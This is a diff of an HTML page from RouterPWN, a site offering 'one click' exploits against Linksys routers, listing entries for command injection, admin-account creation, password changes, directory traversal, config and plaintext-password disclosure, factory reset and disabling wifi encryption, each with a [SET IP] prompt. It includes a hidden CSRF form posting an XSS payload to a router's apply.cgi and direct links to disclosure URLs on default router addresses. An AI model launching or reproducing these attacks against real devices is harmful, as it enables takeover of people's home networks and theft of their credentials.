@@ -2,7 +2,7 @@
 <html>
  <head>
   <title>
-   RouterPWN - Cisco - One click exploits, News, Vulnerabilities, POC, Alerts
+   RouterPWN - Linksys - One click exploits, News, Vulnerabilities, POC, Alerts
   </title>
   <link href="/includes/images/favicon.png" rel="apple-touch-icon"/>
   <link href="/includes/images/favicon.ico" rel="shortcut icon"/>
@@ -81,7 +81,7 @@
      <td>
       <section id="cisco">
        <h1>
-        Cisco
+        Linksys
        </h1>
        <table cellspacing="0" class="display" id="tabla" width="100%">
         <thead>
@@ -220,71 +220,188 @@
          <form action="http://10.0.1.1/apply.cgi" enctype="text/plain" id="CSRFxssPWN" method="post" name="CSRFxssPWN">
           <input name="submit_button" type="hidden" value="%27%3balert(%22i CaN hAZ XSS by G42%22)%3b//&amp;"/>
          </form>
-         <tr>
+		 
+		<tr>
           <td>
-           2013/12/11
+           2015/05/28
           </td>
           <td>
-           One click
+            Advisory
           </td>
           <td>
-           <a href="http://www.exploit-db.com/exploits/30415/">
-            ExploitDB
+           <a href="http://seclists.org/fulldisclosure/2015/May/129">
+Full Disclosure
            </a>
           </td>
           <td>
-           <a href="javascript:epc3925_postxss()">
-            DPC/EPC3925 - Persistent Cross Site Scripting
-           </a>
-           <a href="javascript:epc3925_postxss(ip)" onclick="return ip=prompt('IP:');">
-            [SET IP]
-           </a>
+           <a href="http://seclists.org/fulldisclosure/2015/May/129">
+            WRT54GL 4.30.16 build 6 Unauthenticated Cross Site Scripting</a>
           </td>
           <td>
-           Jeroen
+Alvaro Folgado, Jose Rodriguez, Ivan Sanz
           </td>
          </tr>
          <tr>
           <td>
-           2013/12/11
+           2014/05/04
           </td>
           <td>
            One click
           </td>
           <td>
-           <a href="http://www.exploit-db.com/exploits/30362/">
-            ExploitDB
+           <a href="http://www.1337day.com/exploit/22108">
+           1337day
            </a>
           </td>
           <td>
-           <a href="javascript:epc3925_changepassword()">
-            DPC/EPC3925 - Change Admin Password CSRF
+           <a href="javascript:themoon_remoteexec()">
+            E1500 - Remote Command Execution
            </a>
-           <a href="javascript:epc3925_changepassword(ip)" onclick="return ip=prompt('IP:');">
+           <a href="javascript:themoon_remoteexec(ip)" onclick="return ip=prompt('IP:');">
             [SET IP]
            </a>
           </td>
           <td>
-           Jeroen
+           metasploit
           </td>
          </tr>
          <tr>
           <td>
-           2012/12/13
+           2013/09/23
           </td>
           <td>
            One click
           </td>
           <td>
-           <a href="http://www.exploit-db.com/exploits/23361/">
+           <a href="http://www.exploit-db.com/exploits/28484/">
             ExploitDB
            </a>
           </td>
           <td>
-           <a href="javascript:ciscowlc_dos">
-            Wireless Lan Controller WLC 7.2.110.0 - DOS
+           <a href="javascript:wrt110_command()">
+            WRT110 Remote Command Execution
            </a>
-           <a href="javascript:ciscowlc_dos" onclick="return ip=prompt('IP:');">
+           <a href="javascript:wrt110_command(ip)" onclick="return ip=prompt('IP:');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           metasploit
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2013/06/22
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.s3cur1ty.de/m1adv2013-019">
+            s3cur1ty.de
+           </a>
+          </td>
+          <td>
+           <a href="javascript:x3000_command()">
+            X3000 - OS Command Inyection
+           </a>
+           <a href="javascript:x3000_command(ip)" onclick="return ip=prompt('IP:');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           m1k3
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2013/06/22
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.s3cur1ty.de/m1adv2013-019">
+            s3cur1ty.de
+           </a>
+          </td>
+          <td>
+           <a href="javascript:x3000_addadmin()">
+            X3000 - Add Admin Account
+           </a>
+           <a href="javascript:x3000_addadmin(ip)" onclick="return ip=prompt('IP:');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           m1k3
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2013/05/21
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.s3cur1ty.de/m1adv2013-012">
+            s3cur1ty.de
+           </a>
+          </td>
+          <td>
+           <a href="javascript:wrt160nv2_command()">
+            WRT160nv2 - apply.cgi Remote Command Injection
+           </a>
+           <a href="javascript:wrt160nv2_command(ip)" onclick="return ip=prompt('IP:');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           m1k3
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2013/05/07
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.exploit-db.com/exploits/25292/">
+            Exploit-DB
+           </a>
+          </td>
+          <td>
+           <a href="javascript:e4200_dirtraversal()">
+            E4200 - Directory Traversal
+           </a>
+           <a href="javascript:e4200_dirtraversal(ip)" onclick="return ip=prompt('IP:');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           sqlhacker
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2013/04/15
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://securityevaluators.com/content/case-studies/routers/Vulnerability_Catalog.pdf">
+            Securityevaluators
+           </a>
+          </td>
+          <td>
+           <a href="javascript:javascript:document.CSRFxssPWN.submit()">
+            WRT310Nv2 Cross site scripting
+           </a>
+           <a href="javascript:CSRFxssPWN()">
             [SET IP]
            </a>
           </td>
@@ -294,50 +411,339 @@
          </tr>
          <tr>
           <td>
-           2012/09/12
+           2013/04/15
           </td>
           <td>
            One click
           </td>
           <td>
-           <a href="http://www.exploit-db.com/exploits/23250/">
-            ExploitDB
+           <a href="https://superevr.com/blog/wp-content/uploads/2013/04/linksys_vulns.txt">
+            superevr.com
            </a>
           </td>
           <td>
-           <a href="http://192.168.0.1:8080/filename.gw">
-            DPC2420 - File Configuration Disclosure
+           <a href="http://192.168.1.1/Management.asp/">
+            Router Source Code Disclosure
            </a>
-           <a href="javascript:setip(':8080/filename.gw')" onclick="return ip=prompt('IP:');">
+           <a href="javascript:setip('/Management.asp/')">
             [SET IP]
            </a>
           </td>
           <td>
-           Facundo M. de la Cruz
+           Phil Purviance
           </td>
          </tr>
          <tr>
           <td>
-           2012/12/03
+           2013/04/15
           </td>
           <td>
            One click
           </td>
           <td>
-           <a href="http://www.exploit-db.com/exploits/23361/">
-            ExploitDB
+           <a href="https://superevr.com/blog/wp-content/uploads/2013/04/linksys_vulns.txt">
+            superevr.com
            </a>
           </td>
           <td>
-           <a href="javascript:ciscowlc_addadmin()">
-            Wireless Lan Controller WLC 7.2.110.0 - Add Administrator CSRF
+           <a href="javascript:javascript:document.ea2700pass.submit()">
+            EA2700 WRT310Nv2 Password Change Insufficient Authentication CSRF
            </a>
-           <a href="javascript:ciscowlc_addadmin()" onclick="return ip=prompt('IP:');">
+           <a href="javascript:ea2700passr()">
             [SET IP]
            </a>
           </td>
           <td>
-           Facundo M. de la Cruz
+           Phil Purviance
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2013/04/15
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="https://superevr.com/blog/wp-content/uploads/2013/04/linksys_vulns.txt">
+            superevr.com
+           </a>
+          </td>
+          <td>
+           <a href="javascript:javascript:document.ea2700path.submit()">
+            EA2700 File Path Traversal apply.cgi
+           </a>
+           <a href="javascript:ea2700pathr()">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Phil Purviance
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2013/04/15
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="https://superevr.com/blog/wp-content/uploads/2013/04/linksys_vulns.txt">
+            superevr.com
+           </a>
+          </td>
+          <td>
+           <a href="javascript:javascript:document.ea2700xss.submit()">
+            EA2700 XSS Vulnerability apply.cgi
+           </a>
+           <a href="javascript:ea2700xssr()">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Phil Purviance
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2013/02/08
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.s3cur1ty.de/m1adv2013-016">
+            s3cur1ty.de
+           </a>
+          </td>
+          <td>
+           <a href="javascript:wag200gb_command()">
+            WAG200GB - Remote Command Execution
+           </a>
+           <a href="javascript:wag200gb_command(ip)" onclick="return ip=prompt('IP:');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           m1ke
+          </td>
+         </tr>
+
+         <tr>
+          <td>
+           2011/02/26
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.exploit-db.com/exploits/16252/">
+            ExploitDB
+           </a>
+          </td>
+          <td>
+           <a href="javascript:wag120pass()">
+            WAG120N Change admin password
+           </a>
+           <a href="javascript:wag120passr()">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           IRCRASH
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2011/02/26
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.exploit-db.com/exploits/16252/">
+            ExploitDB
+           </a>
+          </td>
+          <td>
+           <a href="javascript:wag120add()">
+            WAG120N Add admin user
+           </a>
+           <a href="javascript:wag120addr()">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           IRCRASH
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2010/05/26
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://seclists.org/bugtraq/2010/Jun/93">
+Full Disclosure
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.1.245/debug.cgi">
+            WAP54Gv3 debug interface (Gemtek:gemtekswd)
+           </a>
+           <a href="javascript:setip('/debug.cgi')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Cristofaro Mune
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2008/02/26
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.gnucitizen.org/blog/holes-in-embedded-devices-authentication-bypass-pt-4/">
+            gnucitizen.org
+           </a>
+          </td>
+          <td>
+           <a href="javascript:wrtradmin()">
+            WRT54G enable remote interface
+           </a>
+           <a href="javascript:wrtradminr()">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Ginsu Rabbit
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2008/02/26
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.gnucitizen.org/blog/router-hacking-challenge/">
+            gnucitizen.org
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.1.1/Config.bin">
+            WRT54G config disclosure
+           </a>
+           <a href="javascript:setip('/Config.bin')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           pdp
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2008/02/26
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.gnucitizen.org/blog/router-hacking-challenge/">
+            gnucitizen.org
+           </a>
+          </td>
+          <td>
+           <a href="javascript:document.wrtdefault.submit()">
+            WRT54G restore factory defaults
+           </a>
+           <a href="javascript:wrtdefault()">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           pdp
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2008/01/21
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://swbae.egloos.com/1701135">
+            swbae.egloos.com
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.1.1/lastpassword.htm">
+            WRT54G last password in plain text
+           </a>
+           <a href="javascript:setip('/lastpassword.htm')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           opt9
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2006/06/05
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.securityfocus.com/archive/1/442452/30/0/threaded">
+            Securityfocus
+           </a>
+          </td>
+          <td>
+           <a href="javascript:document.wrtwifi.submit()">
+            WRT54G disable wifi encription
+           </a>
+           <a href="javascript:wrtwifi()">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Ginsu Rabbit
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2006/06/05
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.securityfocus.com/archive/1/442452/30/0/threaded">
+            Securityfocus
+           </a>
+          </td>
+          <td>
+           <a href="javascript:wrtadmin()">
+            WRT54G change admin password
+           </a>
+           <a href="javascript:wrtadminr()">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Ginsu Rabbit
           </td>
          </tr>
         </tbody>
